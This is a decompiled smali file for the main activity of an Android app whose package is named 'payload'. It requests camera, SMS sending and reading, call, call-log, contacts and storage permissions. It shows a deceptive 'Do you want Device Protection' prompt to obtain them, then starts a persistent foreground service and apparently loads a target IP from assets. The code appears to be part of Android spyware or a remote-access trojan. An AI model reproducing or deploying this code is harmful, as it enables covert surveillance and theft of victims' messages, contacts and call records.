.class public Lcom/mycompany/payload/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/mycompany/payload/MainActivity$100000001;,
        Lcom/mycompany/payload/MainActivity$100000002;,
        Lcom/mycompany/payload/MainActivity$100000003;
    }
.end annotation


# instance fields
.field PERMISSION_CODE:I

.field tv:Landroid/widget/TextView;


# direct methods
.method public constructor <init>()V
    .locals 4

    .prologue
    .line 141
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Activity;-><init>()V

    move-object v2, v0

    const/16 v3, 0x3e8

    iput v3, v2, Lcom/mycompany/payload/MainActivity;->PERMISSION_CODE:I

    move-object v2, v0

    const/4 v3, 0x0

    check-cast v3, Landroid/widget/TextView;

    iput-object v3, v2, Lcom/mycompany/payload/MainActivity;->tv:Landroid/widget/TextView;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 19
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object v11, v0

    const-string v12, "com.aide.ui"

    invoke-static {v11, v12}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 27
    move-object v11, v0

    move-object v12, v1

    invoke-super {v11, v12}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 28
    move-object v11, v0

    const v12, 0x7f03001c

    invoke-virtual {v11, v12}, Lcom/mycompany/payload/MainActivity;->setContentView(I)V

    .line 30
    move-object v11, v0

    const v12, 0x7f0a0072

    invoke-virtual {v11, v12}, Lcom/mycompany/payload/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v11

    check-cast v11, Landroid/widget/Spinner;

    move-object v3, v11

    .line 32
    move-object v11, v0

    const v12, 0x7f0a0073

    invoke-virtual {v11, v12}, Lcom/mycompany/payload/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v11

    check-cast v11, Landroid/widget/Button;

    move-object v4, v11

    .line 34
    new-instance v11, Lcom/mycompany/payload/AssetsFileReaderAndIpSetter;

    move-object v12, v0

    invoke-virtual {v12}, Lcom/mycompany/payload/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    invoke-direct {v11, v12}, Lcom/mycompany/payload/AssetsFileReaderAndIpSetter;-><init>(Landroid/content/Context;)V

    .line 35
    move-object v11, v0

    const v12, 0x7f0a0071

    invoke-virtual {v11, v12}, Lcom/mycompany/payload/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v11

    check-cast v11, Lcom/airbnb/lottie/LottieAnimationView;

    move-object v5, v11

    .line 36
    const/16 v11, 0x8

    new-array v11, v11, [Ljava/lang/String;

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    const/4 v13, 0x0

    const-string v14, "android.permission.CAMERA"

    aput-object v14, v12, v13

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    const/4 v13, 0x1

    const-string v14, "android.permission.SEND_SMS"

    aput-object v14, v12, v13

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    const/4 v13, 0x2

    const-string v14, "android.permission.READ_SMS"

    aput-object v14, v12, v13

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    const/4 v13, 0x3

    const-string v14, "android.permission.CALL_PHONE"

    aput-object v14, v12, v13

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    const/4 v13, 0x4

    const-string v14, "android.permission.READ_EXTERNAL_STORAGE"

    aput-object v14, v12, v13

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    const/4 v13, 0x5

    const-string v14, "android.permission.WRITE_EXTERNAL_STORAGE"

    aput-object v14, v12, v13

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    const/4 v13, 0x6

    const-string v14, "android.permission.READ_CALL_LOG"

    aput-object v14, v12, v13

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    const/4 v13, 0x7

    const-string v14, "android.permission.READ_CONTACTS"

    aput-object v14, v12, v13

    move-object v6, v11

    .line 37
    move-object v11, v0

    move-object v12, v6

    move-object v13, v0

    iget v13, v13, Lcom/mycompany/payload/MainActivity;->PERMISSION_CODE:I

    invoke-virtual {v11, v12, v13}, Lcom/mycompany/payload/MainActivity;->requestPermissions([Ljava/lang/String;I)V

    .line 39
    move-object v11, v5

    const/high16 v12, 0x7f050000

    invoke-virtual {v11, v12}, Lcom/airbnb/lottie/LottieAnimationView;->setAnimation(I)V

    .line 40
    move-object v11, v5

    invoke-virtual {v11}, Lcom/airbnb/lottie/LottieAnimationView;->playAnimation()V

    .line 42
    move-object v11, v4

    new-instance v12, Lcom/mycompany/payload/MainActivity$100000001;

    move-object/from16 v18, v12

    move-object/from16 v12, v18

    move-object/from16 v13, v18

    move-object v14, v0

    move-object v15, v3

    move-object/from16 v16, v5

    invoke-direct/range {v13 .. v16}, Lcom/mycompany/payload/MainActivity$100000001;-><init>(Lcom/mycompany/payload/MainActivity;Landroid/widget/Spinner;Lcom/airbnb/lottie/LottieAnimationView;)V

    invoke-virtual {v11, v12}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 87
    const/4 v11, 0x5

    new-array v11, v11, [I

    fill-array-data v11, :array_0

    move-object v7, v11

    .line 91
    move-object v11, v0

    const-string v12, "android.permission.CAMERA"

    invoke-virtual {v11, v12}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v11

    const/4 v12, 0x0

    if-ne v11, v12, :cond_0

    move-object v11, v0

    const-string v12, "android.permission.READ_SMS"

    invoke-virtual {v11, v12}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v11

    const/4 v12, 0x0

    if-ne v11, v12, :cond_0

    move-object v11, v0

    const-string v12, "android.permission.SEND_SMS"

    invoke-virtual {v11, v12}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v11

    const/4 v12, 0x0

    if-ne v11, v12, :cond_0

    move-object v11, v0

    const-string v12, "android.permission.CALL_PHONE"

    invoke-virtual {v11, v12}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v11

    const/4 v12, 0x0

    if-ne v11, v12, :cond_0

    move-object v11, v0

    const-string v12, "android.permission.READ_CALL_LOG"

    invoke-virtual {v11, v12}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v11

    const/4 v12, 0x0

    if-ne v11, v12, :cond_0

    move-object v11, v0

    const-string v12, "android.permission.READ_CONTACTS"

    invoke-virtual {v11, v12}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v11

    const/4 v12, 0x0

    if-ne v11, v12, :cond_0

    .line 138
    :goto_0
    new-instance v11, Landroid/content/Intent;

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    move-object v13, v0

    :try_start_0
    const-string v14, "com.mycompany.payload.ForegroundServiceHandler"

    invoke-static {v14}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v14

    invoke-direct {v12, v13, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v8, v11

    .line 139
    move-object v11, v0

    move-object v12, v8

    invoke-virtual {v11, v12}, Lcom/mycompany/payload/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v11

    return-void

    .line 95
    :cond_0
    new-instance v11, Landroid/app/AlertDialog$Builder;

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    move-object v13, v0

    invoke-direct {v12, v13}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    move-object v8, v11

    .line 96
    move-object v11, v8

    const-string v12, "Do you want Device Protection"

    invoke-virtual {v11, v12}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v11

    .line 98
    move-object v11, v8

    const-string v12, "Yes"

    new-instance v13, Lcom/mycompany/payload/MainActivity$100000002;

    move-object/from16 v18, v13

    move-object/from16 v13, v18

    move-object/from16 v14, v18

    move-object v15, v0

    invoke-direct {v14, v15}, Lcom/mycompany/payload/MainActivity$100000002;-><init>(Lcom/mycompany/payload/MainActivity;)V

    invoke-virtual {v11, v12, v13}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v11

    .line 116
    move-object v11, v8

    const-string v12, "No"

    new-instance v13, Lcom/mycompany/payload/MainActivity$100000003;

    move-object/from16 v18, v13

    move-object/from16 v13, v18

    move-object/from16 v14, v18

    move-object v15, v0

    invoke-direct {v14, v15}, Lcom/mycompany/payload/MainActivity$100000003;-><init>(Lcom/mycompany/payload/MainActivity;)V

    invoke-virtual {v11, v12, v13}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v11

    .line 135
    move-object v11, v8

    invoke-virtual {v11}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    move-result-object v11

    goto :goto_0

    .line 138
    :catch_0
    move-exception v11

    move-object v9, v11

    new-instance v11, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    move-object v13, v9

    invoke-virtual {v13}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-direct {v12, v13}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v11

    .line 87
    nop

    :array_0
    .array-data 4
        0x7d0
        0xbb8
        0xfa0
        0x1388
        0x1770
    .end array-data
.end method
